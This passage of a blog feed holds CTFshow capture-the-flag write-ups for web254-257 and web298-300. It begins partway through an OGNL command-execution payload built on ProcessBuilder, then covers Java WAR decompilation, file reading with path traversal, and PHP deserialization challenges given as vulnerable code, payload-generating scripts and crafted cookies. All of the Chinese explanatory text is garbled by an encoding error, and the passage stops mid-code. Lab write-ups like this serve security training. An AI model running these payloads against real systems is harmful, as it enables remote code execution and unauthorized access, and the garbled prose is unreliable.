FLAG&#x27;).(#iswin=(@java.lang.System@getProperty(&#x27;os.name&#x27;).toLowerCase().contains(&#x27;win&#x27;))).(#cmds=(#iswin?&#123;&#x27;cmd.exe&#x27;,&#x27;/c&#x27;,#cmd&#125;:&#123;&#x27;/bin/bash&#x27;,&#x27;-c&#x27;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web298"><a href="#web298" class="headerlink" title="web298"></a>web298</h1><blockquote><p>å·¥å…·ï¼š<a href="https://github.com/java-decompiler/jd-gui/releases">https://github.com/java-decompiler/jd-gui/releases</a></p></blockquote><h3 id="åç¼–è¯‘"><a href="#åç¼–è¯‘" class="headerlink" title="åç¼–è¯‘"></a>åç¼–è¯‘</h3><p>æç¤ºï¼šçœ‹çœ‹ä»£ç ï¼Œäº†è§£ä¸‹å’Œphpä¸ä¸€æ ·çš„åœ°æ–¹<br>é¢˜ç›®é™„ä»¶ä¸€ä¸ªwaråŒ…<br>jaråŒ…å’ŒwaråŒ…éƒ½å¯ä»¥çœ‹æˆå‹ç¼©æ–‡ä»¶ï¼Œéƒ½å¯ä»¥ç”¨è§£å‹è½¯ä»¶æ‰“å¼€ï¼ŒjaråŒ…å’ŒwaråŒ…éƒ½æ˜¯ä¸ºäº†é¡¹ç›®çš„éƒ¨ç½²å’Œå‘å¸ƒï¼Œé€šå¸¸åœ¨æ‰“åŒ…éƒ¨ç½²çš„æ—¶å€™ï¼Œä¼šåœ¨é‡Œé¢åŠ ä¸Šéƒ¨ç½²çš„ç›¸å…³ä¿¡æ¯ã€‚è¿™ä¸ªæ‰“åŒ…å®é™…ä¸Šå°±æ˜¯æŠŠä»£ç å’Œä¾èµ–çš„ä¸œè¥¿å‹ç¼©åœ¨ä¸€èµ·ï¼Œå˜æˆåç¼€åä¸º.jarå’Œ.warçš„æ–‡ä»¶ï¼Œå°±æ˜¯æˆ‘ä»¬è¯´çš„jaråŒ…å’ŒwaråŒ…ã€‚ä½†æ˜¯è¿™ä¸ªâ€œå‹ç¼©åŒ…â€å¯ä»¥è¢«ç¼–è¯‘å™¨ç›´æ¥ä½¿ç”¨ï¼ŒæŠŠwaråŒ…æ”¾åœ¨tomcatç›®å½•çš„webappä¸‹ï¼ŒtomcatæœåŠ¡å™¨åœ¨å¯åŠ¨çš„æ—¶å€™å¯ä»¥ç›´æ¥ä½¿ç”¨è¿™ä¸ªwaråŒ…ã€‚é€šå¸¸tomcatçš„åšæ³•æ˜¯è§£å‹ï¼Œç¼–è¯‘é‡Œé¢çš„ä»£ç ï¼Œæ‰€ä»¥å½“æ–‡ä»¶å¾ˆå¤šçš„æ—¶å€™ï¼Œtomcatçš„å¯åŠ¨ä¼šå¾ˆæ…¢ã€‚<br>jaråŒ…å’ŒwaråŒ…çš„åŒºåˆ«ï¼šjaråŒ…æ˜¯javaæ‰“çš„åŒ…ï¼ŒwaråŒ…å¯ä»¥ç†è§£ä¸ºjavawebæ‰“çš„åŒ…ï¼Œè¿™æ ·ä¼šæ¯”è¾ƒå¥½è®°ã€‚jaråŒ…ä¸­åªæ˜¯ç”¨javaæ¥å†™çš„é¡¹ç›®æ‰“åŒ…æ¥çš„ï¼Œé‡Œé¢åªæœ‰ç¼–è¯‘åçš„classå’Œä¸€äº›éƒ¨ç½²æ–‡ä»¶ã€‚è€ŒwaråŒ…é‡Œé¢çš„ä¸œè¥¿å°±å…¨äº†ï¼ŒåŒ…æ‹¬å†™çš„ä»£ç ç¼–è¯‘æˆçš„classæ–‡ä»¶ï¼Œä¾èµ–çš„åŒ…ï¼Œé…ç½®æ–‡ä»¶ï¼Œæ‰€æœ‰çš„ç½‘ç«™é¡µé¢ï¼ŒåŒ…æ‹¬htmlï¼Œjspç­‰ç­‰ã€‚ä¸€ä¸ªwaråŒ…å¯ä»¥ç†è§£ä¸ºæ˜¯ä¸€ä¸ªwebé¡¹ç›®ï¼Œé‡Œé¢æ˜¯é¡¹ç›®çš„æ‰€æœ‰ä¸œè¥¿ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692546287592-358916c4-a359-4a79-b07b-32ae6fb35c9c.png" alt="image.png"><br>ç„¶åå»çœ‹è¿™ä¸ªgetVipStatusï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547078594-3886eb60-120b-4d06-b79e-d8cfe8206fd1.png" alt="image.png"><br>ä½†æ˜¯ä¸çŸ¥é“åœ¨å“ªé‡ŒåŠ å…¥usernameå’Œpasswordï¼Œçœ‹äº†wpå‘ç°æ˜¯åœ¨ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ctfshow/login?username=admin&amp;password=ctfshow</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸çŸ¥é“è¿™ä¸ªè·¯å¾„æ˜¯å“ªé‡Œæ¥çš„ã€‚</p><h1 id="web299"><a href="#web299" class="headerlink" title="web299"></a>web299</h1><h3 id="æ–‡ä»¶è¯»å–"><a href="#æ–‡ä»¶è¯»å–" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h3><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547324053-0afe36c1-6e1c-4a6b-a225-cd24938ac84d.png" alt="image.png"><br>è®¿é—®ä¹‹åå‘ç°é¡µé¢æ²¡å˜åŒ–ï¼Œæ„Ÿè§‰åƒæ˜¯æ–‡ä»¶è¯»å–ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547431499-7895a6b5-2af5-4057-97c9-a837ecb8de82.png" alt="image.png"><br>ç¡®å®å¯ä»¥è¯»å–ï¼ŒæŒ‰ç…§ä¸Šä¸€é“é¢˜çš„æ–‡ä»¶å†…å®¹è®¿é—®ä¸€ä¸‹ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547505252-22399b93-619d-49a0-9b4f-7bfe36fe2c57.png" alt="image.png"><br>ç»ˆäºæ‡‚äº†ä»–è¿™ä¸ªè·¯å¾„äº†ï¼š<br>è®¿é—®<code>WEB-INF/classes/com/ctfshow/servlet/GetFlag.class</code><br>å‘ç°ç–‘ä¼¼flagæ–‡ä»¶ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547630499-b459228b-a93a-428f-92ff-6a283f7fea98.png" alt="image.png"><br>è®¿é—®<code>/fl3g</code>å¾—ç›®å½•ç©¿è¶Šä¸€ä¸‹<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547692626-234dd616-bf9d-4eb3-9003-4431915f9fc8.png" alt="image.png"></p><h1 id="web300"><a href="#web300" class="headerlink" title="web300"></a>web300</h1><p>ç±»ä¼¼ä¸Šé¢˜ï¼Œä½†æ˜¯æ–‡ä»¶åä¸º<code>/f1bg</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692547796528-d30aa8b6-7ed2-48d8-8352-c0651a92428e.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web254-web278ååºåˆ—åŒ–ç¯‡</title>
      <link href="/2023/09/17/web254-web278%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/"/>
      <url>/2023/09/17/web254-web278%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h1><p>å’Œååºåˆ—åŒ–æ²¡å•¥å…³ç³»ï¼Œå¯èƒ½åªæ˜¯æ¥äº†è§£ä¸€ä¸‹ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>)&#123;</span><br><span class="line">      <span class="variable language_">$this</span>-&gt;isVip=<span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">      <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$user</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">      <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?username=xxxxxx&amp;password=xxxxxx</span><br></pre></td></tr></table></figure><h1 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cookieä¼ å…¥ååºåˆ—åŒ–å‚æ•°ï¼Œè¿™é‡Œéœ€è¦æ³¨æ„ä¸€ä¸ªå¡äº†æˆ‘æŒºé•¿æ—¶é—´çš„ç‚¹å°±æ˜¯åˆ†å·ä½œä¸ºcookieä¸­åˆ†å‰²ç¬¦ï¼Œååºåˆ—åŒ–ä¸­å‡ºç°çš„åˆ†å·è¦ç”¨urlè½¬ä¹‰ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;%3B&#x27;</span>, <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GETï¼š</span><br><span class="line">?username=xxxxxx</span><br><span class="line">&amp;password=xxxxxx</span><br><span class="line">COOKIEï¼š</span><br><span class="line">user=O:<span class="number">11</span>:<span class="string">&quot;ctfShowUser&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">8</span>:<span class="string">&quot;username&quot;</span>%<span class="number">3</span>Bs:<span class="number">6</span>:<span class="string">&quot;xxxxxx&quot;</span>%<span class="number">3</span>Bs:<span class="number">8</span>:<span class="string">&quot;password&quot;</span>%<span class="number">3</span>Bs:<span class="number">6</span>:<span class="string">&quot;xxxxxx&quot;</span>%<span class="number">3</span>Bs:<span class="number">5</span>:<span class="string">&quot;isVip&quot;</span>%<span class="number">3</span>Bb:<span class="number">1</span>%<span class="number">3</span>B&#125;</span><br></pre></td></tr></table></figure><h1 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkVip</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;isVip;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">vipOneKeyGetFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;isVip)&#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username!==<span class="variable language_">$this</span>-&gt;password)&#123;</span><br><span class="line">                    <span class="keyword">echo</span> <span class="string">&quot;your flag is &quot;</span>.<span class="variable">$flag</span>;</span><br><span class="line">              &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;no vip, no flag&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line"><span class="variable">$password</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$username</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">    <span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>]);    </span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">login</span>(<span class="variable">$username</span>,<span class="variable">$password</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">checkVip</span>())&#123;</span><br><span class="line">            <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">vipOneKeyGetFlag</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;no vip,no flag&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$isVip</span>=<span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfShowUser</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure><p>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?username=admin</span><br><span class="line">&amp;password=xxxxxx</span><br><span class="line">COOKIE</span><br><span class="line">user=O%<span class="number">3</span>A11%<span class="number">3</span>A%<span class="number">22</span>ctfShowUser%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>username%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>admin%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>password%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>xxxxxx%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>isVip%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure><h1 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$isVip</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$class</span> = <span class="string">&#x27;info&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>=<span class="title">new</span> <span class="title">info</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">login</span>($<span class="title">u</span>,$<span class="title">p</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username===<span class="variable">$u</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;password===<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="class"><span class="keyword">class</span>-&gt;<span class="title">getInfo</span>();</span></span><br><span class="line"><span class="class">    &#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&#125;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"><span class="title">class</span> <span class="title">info</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    <span 